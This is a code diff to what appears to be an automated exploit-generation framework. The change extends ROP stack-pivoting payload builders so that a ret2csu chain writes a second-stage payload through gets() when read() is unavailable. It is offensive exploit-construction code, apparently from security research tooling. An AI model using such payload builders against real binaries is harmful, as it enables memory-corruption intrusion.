@@ -65,13 +65,23 @@ std::vector<RopPayload> BasicStackPivoting::getRopPayloadList() const {
         ConstantExpr::create(0, Expr::Int64)
     };
 
-    // Write the 2nd stage ROP payload via read() to `pivot_dest`
-    // via ret2csu(read, 0, pivot_dest, 1024).
-    RopPayload part2 = ret2csu->getRopPayloadList(
-        BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
-        ConstantExpr::create(0, Expr::Int64),
-        BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
-        ConstantExpr::create(1024, Expr::Int64))[0];
+    // Write the 2nd stage ROP payload via read() or gets() to `pivot_dest`.
+    RopPayload part2;
+
+    if (elf.hasSymbol("read")) {
+        part2 = ret2csu->getRopPayloadList(
+                BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
+                ConstantExpr::create(0, Expr::Int64),
+                BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
+                ConstantExpr::create(1024, Expr::Int64))[0];
+
+    } else if (elf.hasSymbol("gets")) {
+        part2 = ret2csu->getRopPayloadList(
+                BaseOffsetExpr::create<BaseType::SYM>(elf, "gets"),
+                BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
+                ConstantExpr::create(0, Expr::Int64),
+                ConstantExpr::create(0, Expr::Int64))[0];
+    }
 
     // Perform stack pivoting.
     RopPayload part3 = {
@@ -121,7 +131,7 @@ bool AdvancedStackPivoting::checkRequirements() const {
     const ELF &elf = g_crax->getExploit().getElf();
 
     return StackPivoting::checkRequirements() &&
-           elf.symbols().find("read") != elf.symbols().end() &&
+           elf.hasSymbol("read") &&
            m_readCallSites.size();
 }
 
@@ -207,7 +217,7 @@ std::vector<RopPayload> AdvancedStackPivoting::getRopPayloadList() const {
 
 void AdvancedStackPivoting::maybeInterceptReadCallSites(S2EExecutionState *state,
                                                         const Instruction &i) {
-    if (g_crax->isCallSiteOf(i.address, "read")) {
+    if (g_crax->isCallSiteOf(i, "read")) {
         uint64_t buf = reg().readConcrete(Register::X64::RSI);
         uint64_t len = reg().readConcrete(Register::X64::RDX);
         m_readCallSites.insert({i.address, buf, len});
